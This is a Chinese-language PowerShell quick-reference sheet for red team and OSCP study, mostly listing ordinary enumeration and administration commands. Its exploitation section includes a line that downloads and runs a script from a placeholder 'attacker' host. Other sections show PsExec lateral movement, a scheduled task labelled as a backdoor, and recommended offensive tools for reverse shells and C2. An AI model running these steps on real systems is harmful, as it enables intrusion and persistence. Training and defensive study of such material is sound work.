# PowerShell 实战命令速查表 (红队 / OSCP 方向)

> 适合红队、蓝队、OSCP 学习路线，支持实战复盘和快速查阅

---

## 🧭 系统信息与用户枚举

```powershell
whoami                       # 当前用户名
hostname                    # 主机名
Get-ComputerInfo            # 系统详细信息
Get-LocalUser               # 列出本地用户
Get-LocalGroup              # 列出本地用户组
net user                    # 所有用户信息
net localgroup              # 所有组信息
net user <username>         # 查看某用户详细资料
```

---

## 📂 文件系统与服务操作

```powershell
Get-ChildItem               # 类似 ls，可查看目录内容
Get-ChildItem -Recurse      # 递归查看所有文件
Get-Content file.txt        # 查看文件内容（类似 cat）
Set-Content file.txt "abc"  # 写入内容

Get-Service                 # 列出所有服务
Get-Service -Name wuauserv  # 查看某个服务
Start-Service <name>       # 启动服务
Stop-Service <name>        # 停止服务
```

---

## 🔐 权限与进程枚举

```powershell
Get-Process                 # 所有进程（类似 ps）
Get-Process -Id 1234        # 指定 ID 进程
Get-NetTCPConnection        # 网络连接及 PID（需导入 NetTCPModule）
Get-FileHash file.exe       # 文件哈希值（检测完整性）
Get-LocalGroupMember Administrators  # 查看管理员组成员
whoami /priv               # 查看权限（可用 whoami 命令）
```

---

## 🌐 网络信息枚举

```powershell
ipconfig                   # IP 地址等信息
Test-Connection 8.8.8.8    # 类似 ping
Get-NetTCPConnection       # 所有 TCP 连接
Resolve-DnsName example.com # DNS 解析
```

---

## 🧪 提权与漏洞利用辅助

```powershell
# 下载并运行远程脚本（谨慎使用）
iwr -uri http://attacker/shell.ps1 -OutFile shell.ps1
.\shell.ps1

# 查找服务的执行路径和权限
Get-WmiObject win32_service | Select-Object Name,DisplayName,PathName,StartMode | Format-Table -AutoSize
```

---

## 🚪 远程执行与横向移动

```powershell
Enter-PSSession -ComputerName targetIP -Credential (Get-Credential)
Invoke-Command -ComputerName targetIP -ScriptBlock { whoami }

# 使用 PsExec 工具
PsExec.exe \\targetIP cmd
```

---

## 📦 脚本与日志

```powershell
Get-EventLog -LogName Security -Newest 20   # 安全日志
Get-ScheduledTask                           # 查看计划任务
Register-ScheduledTask                     # 注册后门任务
```

---

## 🔄 管道与过滤（Where-Object）

```powershell
Get-Process | Where-Object { $_.CPU -gt 100 }
Get-Service | Where-Object { $_.Status -eq 'Running' }
```

---

## 🧰 推荐工具（红队）

- PowerView.ps1 （域枚举）
- PowerUp.ps1 （本地提权）
- Nishang（反弹 shell）
- Empire / Covenant（C2 框架）

---

> 💡 建议搭配 TryHackMe 的 PowerShell for Hackers 路线练习

如需 Bash + PowerShell 对照表，也可以继续补充！
